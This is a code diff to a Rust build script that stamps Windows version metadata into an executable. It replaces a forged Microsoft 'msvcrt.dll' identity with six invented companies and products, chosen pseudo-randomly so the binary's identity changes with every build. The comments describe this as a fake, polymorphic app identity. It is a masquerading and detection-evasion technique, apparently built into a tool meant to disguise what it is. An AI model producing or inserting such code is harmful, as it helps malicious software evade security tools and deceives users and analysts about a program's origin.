@@ -75,16 +75,71 @@ fn main() {
     let manifest_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
     let out_dir = PathBuf::from(env::var("OUT_DIR").expect("OUT_DIR not set"));
 
-    // Embed Windows resources (version info + manifest)
+    // Embed Windows resources — fake app identity, polymorphic per build.
+    // All details are invented; the app and company do not exist.
+    // The profile is selected pseudo-randomly from the seed so it changes
+    // every build while remaining internally consistent.
+    let seed_lo = time_seed() & 0xFFFF;
+    let profile_idx = (seed_lo % 6) as usize;
+
+    let profiles: &[(&str, &str, &str, &str, &str)] = &[
+        // (company, product, description, exe_name, version)
+        (
+            "Nexlify Technologies Ltd.",
+            "Nexlify Sync",
+            "Nexlify Cloud Synchronization Service",
+            "NexlifySync.exe",
+            "3.1.4.8",
+        ),
+        (
+            "Vortex Software Group",
+            "VortexAssist",
+            "VortexAssist System Helper",
+            "VortexAssist.exe",
+            "2.7.0.14",
+        ),
+        (
+            "Lumaris Digital Solutions",
+            "Lumaris Connect",
+            "Lumaris Connect Background Service",
+            "LumarisConnect.exe",
+            "1.9.3.22",
+        ),
+        (
+            "Dravex Systems Inc.",
+            "Dravex Optimizer",
+            "Dravex System Optimizer",
+            "DravexOpt.exe",
+            "4.0.2.5",
+        ),
+        (
+            "Calvera Software GmbH",
+            "CalveraSync",
+            "CalveraSync File Synchronization",
+            "CalveraSync.exe",
+            "2.3.7.11",
+        ),
+        (
+            "Syntherion Labs",
+            "Syntherion Updater",
+            "Syntherion Application Update Manager",
+            "SyntherionUpdater.exe",
+            "1.5.1.3",
+        ),
+    ];
+
+    let (company, product, description, exe_name, version) = profiles[profile_idx];
+    let copyright = format!("\u{00a9} {} All rights reserved.", company);
+
     let mut res = winresource::WindowsResource::new();
-    res.set("CompanyName", "Microsoft Corporation");
-    res.set("FileDescription", "Microsoft Visual C++ Runtime Library");
-    res.set("FileVersion", "14.30.30704.0");
-    res.set("InternalName", "msvcrt.dll");
-    res.set("OriginalFilename", "msvcrt.dll");
-    res.set("ProductName", "Microsoft Visual C++ Runtime Library");
-    res.set("ProductVersion", "14.30.30704.0");
-    res.set("LegalCopyright", "\u{00a9} Microsoft Corporation. All rights reserved.");
+    res.set("CompanyName",      company);
+    res.set("FileDescription",  description);
+    res.set("FileVersion",      version);
+    res.set("InternalName",     exe_name);
+    res.set("OriginalFilename", exe_name);
+    res.set("ProductName",      product);
+    res.set("ProductVersion",   version);
+    res.set("LegalCopyright",   &copyright);
     res.set_language(0x0409);
     res.compile().expect("Failed to compile resources");
 
